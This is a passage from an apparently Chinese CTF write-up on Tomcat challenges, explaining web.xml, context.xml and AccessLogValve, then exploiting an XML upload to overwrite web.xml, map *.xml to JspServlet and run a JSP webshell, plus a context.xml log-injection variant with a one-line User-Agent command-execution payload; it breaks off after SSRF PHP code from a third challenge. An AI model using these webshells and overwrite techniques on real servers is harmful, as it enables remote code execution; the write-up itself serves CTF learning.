+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>io.github.hengyunabc.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里定义了<code>servlet-mapping</code>也就是我们的映射。<code>&lt;servlet-mapping&gt;</code>标签下定义的<code>&lt;servlet-name&gt;</code>内容就是我们<code>&lt;servlet&gt;</code>标签下对应的<code>&lt;servlet-name&gt;</code>，代表着用该对应名字的<code>servlet</code>进行处理。</p>
+<p>而<code>&lt;servlet-mapping&gt;</code>标签下的<code>&lt;url-pattern&gt;</code>内容代表着映射到<code>xxx</code>下。<code>&lt;servlet&gt;</code>标签下的<code>&lt;servlet-class&gt;</code>的内容代表着使用某个类下的内容进行处理。(是写好的自定义servlet处理方式或者是官方的servlet配置)</p>
+<p>如果我们需要添加一个新映射，就可以通过修改<code>web.xml</code>进行，并且一旦文件被修改了，<strong>就会立刻重新加载这个文件而不用重启服务器。</strong></p>
+<h2><span id="serverxml-amp-contextxml"> server.xml &amp; context.xml</span></h2>
+<p><code>context.xml</code>是tomcat公用的上下文环境配置。</p>
+<p>context.xml的基本结构如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line">    &lt;!-配置全局参数，例如设置默认语言、编码等 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">Parameter</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Parameter</span>&gt;</span></span><br><span class="line">    &lt;!-配置监听器 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">Listener</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Listener</span>&gt;</span></span><br><span class="line">    &lt;!-配置过滤器 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">Filter</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Filter</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 配置Valve组件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Valve</span>  /&gt;</span></span><br><span class="line">    </span><br><span class="line">    &lt;!-配置Servlet --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">Servlet</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Servlet</span>&gt;</span></span><br><span class="line">    &lt;!-配置Servlet映射 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ServletMapping</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ServletMapping</span>&gt;</span></span><br><span class="line">    &lt;!-配置JSP页面 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">JspConfig</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">JspConfig</span>&gt;</span></span><br><span class="line">    &lt;!-配置错误页面 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ErrorPage</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ErrorPage</span>&gt;</span></span><br><span class="line">    &lt;!-配置资源加载 --&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">Resources</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到还是能够配置<code>servlet</code>以及映射的。</p>
+<p>这里讲一下一个比较特别的valve组件，给出的示例是利用valve来写记录日志：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;/web/www/logs&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;www_access.&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.log&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t &quot;</span>%<span class="attr">r</span>&quot; %<span class="attr">s</span> %<span class="attr">b</span>&quot; /&gt;</span> </span><br><span class="line">        </span><br><span class="line"><span class="comment">&lt;!--   定义一个Valve组件，用来记录tomcat的访问日志，日志存放目录为：/web/www/logs如果定义为相对路径则是相当于$CATALINA_HOME，并非相对于appBase，这个要注意。定义日志文件前缀为www_access.并以.log结尾，pattern定义日志内容格式，具体字段表示可以查看tomcat官方文档   --&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>如果需要记录<code>user-agent</code>只需要改pattern即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;/web/www/logs&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;asd&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.jsp&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%&#123;User-Agent&#125;i&quot;</span> /&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>可以看到这里记录了我们的ua头，并且页面的后缀是jsp，如果我们的ua头里面记录的jsp的代码，就可以被写入到这个<code>/web/www/logs/asd.jsp</code>下。</p>
+<p>server.xml也是对tomcat的服务器设置，可以进行端口号设置，添加虚拟机，添加各种listener、filter、valve等组件。</p>
+<p>server.xml和context.xml的区别在于，<code>context.xml</code>和<code>web.xml</code>一样，一旦文件被修改了，**就会立刻重新加载这个文件而不用重启服务器。**而<code>server.xml</code>是不可动态重新加载的资源，服务器一旦启动后，要修改这个文件就只能够重启服务器进行重新加载。</p>
+<h2><span id="tomcat-usersxml"> tomcat-users.xml</span></h2>
+<p>可以查看tomcat的账号密码，默认是注释掉的，要把注释去掉才能生效。</p>
+<h2><span id="回到本题"> 回到本题</span></h2>
+<p>这题让我们读取xml文件，禁读web.xml，并且有一个需要登录的路由，不难想到让我们先读<code>tomcat-users.xml</code>获取到tomcat的账号密码。</p>
+<img src="/posts/undefined/12.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">This_is_my_favorite_passwd</span><br></pre></td></tr></table></figure>
+<p>登录成功后就跳转到了上传，不知道有什么用，burp抓包发现了个path参数</p>
+<img src="/posts/undefined/13.png" class title="awa">
+<p>并且测试发现只允许上传xml后缀的文件</p>
+<p>默认是/uploads/</p>
+<p>不知道在哪，等下试试。应该是<code>/myapp/uploads/xxx</code></p>
+<img src="/posts/undefined/14.png" class title="awa">
+<p>还真是，看着能传到任意位置。</p>
+<p>搜一下tomcat文件上传+xml</p>
+<img src="/posts/undefined/15.png" class title="awa">
+<p>第一个github</p>
+<img src="/posts/undefined/16.png" class title="awa">
+<p>看一下这个例题(在github里是通过修改web.xml)：<code>RWCTF2022 DesperateCat</code></p>
+<p>找了y4神的博客：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/122678827">https://blog.csdn.net/solitudi/article/details/122678827</a></p>
+<img src="/posts/undefined/17.png" class title="awa">
+<p>web.xml，能覆盖吗？</p>
+<p>如果能覆盖就能够重新加载jar包，但是我们也写不了jar包。</p>
+<p>先试试吧，而且由于题目不给读web.xml，我们不知道能不能覆盖成功，随便写点123，如果成功了tomcat应该会崩溃？</p>
+<p>能传，但是不知道能不能覆盖成功，按道理来说应该是可以的，能写入。</p>
+<p>只能写web.xml，能干吗呢？</p>
+<p>只能传xml，如果文件上传是jsp就好了，对应php里只能传一个png文件但是要你rce。</p>
+<p>有没有啥办法能让xml解析成jsp?</p>
+<img src="/posts/undefined/18.png" class title="awa">
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/allway2/article/details/110441243">https://blog.csdn.net/allway2/article/details/110441243</a></p>
+<p>奇怪的东西，标题是将.jsp改成.php，好像是将/tomcatpool.jsp -&gt; /tomcatpool.php，但实际上应该还是jsp解析。</p>
+<p>那反过来说就是说php -&gt; jsp</p>
+<p>我们要定义一个servlet来解析jsp啊，服了。有没有现成的jsp处理器</p>
+<p><a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/jasper/servlet/JspServlet.html">https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/jasper/servlet/JspServlet.html</a></p>
+<p>还真有：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.jasper.servlet.JspServlet</span><br><span class="line"><span class="comment">//The JSP engine (a.k.a Jasper). The servlet container is responsible for providing a URLClassLoader for the web application context Jasper is being used in. Jasper will try get the Tomcat ServletContext attribute for its ServletContext class loader, if that fails, it uses the parent class loader. In either case, it must be a URLClassLoader.</span></span><br></pre></td></tr></table></figure>
+<p>可以改一下web.xml了，注意这里是常规的web.xml对servlet的定义：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jspjsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jspjsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>把它修改成web.xml，这里随便找了一个示例demo的web.xml：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hengyunabc/executable-embeded-tomcat-sample/blob/master/src/main/resources/WEB-INF/web.xml">https://github.com/hengyunabc/executable-embeded-tomcat-sample/blob/master/src/main/resources/WEB-INF/web.xml</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jspjsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jspjsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>试试把web.xml覆盖</p>
+<img src="/posts/undefined/19.png" class title="awa">
+<p>好像可以了，这里放上上传后的对比图，发现原本报错的页面能够正常解析了：</p>
+<img src="/posts/undefined/20.png" class title="awa">
+<p>看看能不能解析jsp了：</p>
+<img src="/posts/undefined/21.png" class title="awa">
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">        pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Jsp&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">        &lt;%</span><br><span class="line">                System.out.println(<span class="string">&quot;test jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">double</span> <span class="variable">number</span> <span class="operator">=</span> Math.random();</span><br><span class="line">        %&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p&gt;</span><br><span class="line">                Math.random():</span><br><span class="line">                &lt;%=number%&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/22.png" class title="awa">
+<p>出了！</p>
+<p>接下来只需要找一个jsp webshell即可：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Process process = runtime.exec(&quot;whoami&quot;);</span></span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> runtime.exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/23.png" class title="awa">
+<h1><span id="tomtom2-revenge"> tomtom2-revenge</span></h1>
+<p>tomtom2阻止我们读取web.xml，但是能够意外地覆盖掉web.xml，所以该revenge题针对<code>web.xml</code>进行了过滤，我们不能够再上传并且覆盖web.xml了。</p>
+<p>对于这四个xml，我们就剩下<code>server.xml</code>和<code>context.xml</code>没有用了，其中<code>server.xml</code>不能够进行热加载，所以希望只能够放在覆写<code>context.xml</code>。</p>
+<p>还记得我们的valve组件吗，通过覆写<code>context.xml</code>添加valve记录我们的ua头到一个.jsp文件，其中该jsp文件记录下我们的恶意ua头即可执行任意命令。</p>
+<p>恶意context.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;/opt/tomcat/webapps/myapp&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;asd&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.jsp&quot;</span> </span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%&#123;User-Agent&#125;i&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意生成的日志文件名字应该为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix.Y-M-D.suffix</span><br></pre></td></tr></table></figure>
+<p>在这里，比如你是2024-8-28生成的日志，则日志名字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asd.2024-8-28.jsp</span><br></pre></td></tr></table></figure>
+<p>由于放在了<code>/myapp</code>下，所以通过<code>/myapp/asd.2024-8-28.jsp</code>访问就能记录下你的ua头。</p>
+<p>设置ua头，注意，由于ua头会对引号进行自动转义，包括unicode的转义符号，所以我们的webshell是不能够出现引号的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[0])).getInputStream()).useDelimiter(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[1])).next() %&gt;</span><br></pre></td></tr></table></figure>
+<p>这里需要定义<code>Delimiter</code>，一般在我们的java里都是用<code>\\A</code>。并且获取到我们的传参键值对。第一个键值对作为exec的内容，第二个键值对作为<code>delimiter</code>因此再往jsp传值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=xxx&amp;1=\A</span><br></pre></td></tr></table></figure>
+<p>这里\要urlencode一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=xxx&amp;1=\\A</span><br></pre></td></tr></table></figure>
+<h1><span id="网络照相馆"> 网络照相馆</span></h1>
+<p>题目提示：</p>
+<blockquote>
+<p>注意hash_file函数</p>
+</blockquote>
+<p>能够通过/url.php进行ssrf：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;sql.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$baseDir </span>= <span class="string">&quot;data/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$parse </span>= <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$parse</span>[<span class="string">&#x27;host&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;url错误！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data </span>= <span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$filename </span>= <span class="variable">$baseDir </span>.  <span class="title function_ invoke__">get_filename</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename </span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">check</span>(<span class="variable">$conn</span>, <span class="variable">$filename</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename </span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$sql </span>= <span class="string">&quot;INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$stmt </span>= <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&quot;ss&quot;</span>, <span class="variable">$url</span>, <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>function.php</p>
